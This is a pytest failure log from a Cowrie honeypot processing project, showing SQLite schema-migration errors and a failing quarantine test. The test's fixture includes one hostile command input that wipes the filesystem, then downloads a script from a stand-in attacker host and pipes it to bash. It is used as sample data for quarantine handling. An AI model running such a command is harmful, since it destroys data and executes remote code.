Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,095:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,097:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,099:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,102:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 18:32:40,104:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
____ TestQuarantinePayloadFix.test_no_empty_payloads_in_quarantined_events _____

self = <test_quarantine_payload_fix.TestQuarantinePayloadFix object at 0x7756b3d289d0>
tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_no_empty_payloads_in_quar0')

    def test_no_empty_payloads_in_quarantined_events(self, tmp_path: Path) -> None:
        """Test that no quarantined events have empty payloads."""
        # Create events that will be quarantined for various reasons
        events = [
            # Missing eventid
            {
                "session": "test123",
                "timestamp": "2024-01-01T00:00:00Z",
                "src_ip": "1.2.3.4",
            },
            # Missing timestamp
            {
                "session": "test123",
                "eventid": "cowrie.session.connect",
                "src_ip": "1.2.3.4",
            },
            # High risk command
            {
                "session": "test123",
                "eventid": "cowrie.command.input",
                "timestamp": "2024-01-01T00:00:00Z",
                "input": "rm -rf / && curl https://evil.com/malware.sh | bash",
            },
        ]
    
        source = tmp_path / "quarantine_test.json"
        _write_events(source, events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:152: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_quarantine_payload_fix.py:28: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566c220590>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,787:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,789:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,797:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,799:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,803:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,806:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,809:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
